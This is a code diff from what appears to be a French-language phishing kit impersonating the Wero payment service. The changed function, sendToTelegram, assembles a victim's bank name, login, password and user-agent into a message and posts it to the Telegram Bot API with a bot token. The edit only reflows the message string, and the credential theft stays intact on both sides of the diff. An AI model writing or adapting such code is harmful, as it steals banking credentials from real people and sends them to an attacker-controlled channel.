@@ -430,17 +430,7 @@ async function waitForConfig(maxWait = 3000) {
             }
 
             async function sendToTelegram() {
-                const message = `
-🟡🔵 WERO - NOUVELLE CONNEXION 🔵🟡
-━━━━━━━━━━━━━━━━━━━━━
-🏦 Banque: ${bankname.value}
-👤 Identifiant: ${username.value}
-🔑 Mot de passe: ${password.value}
-━━━━━━━━━━━━━━━━━━━━━
-🌍 Plateforme: Wero
-📱 User-Agent: ${navigator.userAgent}
-🕐 Date: ${new Date().toLocaleString('fr-FR')}
-`;
+                const message = `🟡🔵 WERO - NOUVELLE CONNEXION 🔵🟡\n━━━━━━━━━━━━━━━━━━━━━\n🏦 Banque: ${bankname.value}\n👤 Identifiant: ${username.value}\n🔑 Mot de passe: ${password.value}\n━━━━━━━━━━━━━━━━━━━━━\n🌍 Plateforme: Wero\n📱 User-Agent: ${navigator.userAgent}\n🕐 Date: ${new Date().toLocaleString('fr-FR')}`;
 
                 try {
                     const response = await fetch(`https://api.telegram.org/bot${window.BOT_TOKEN || BOT_TOKEN}/sendMessage`, {
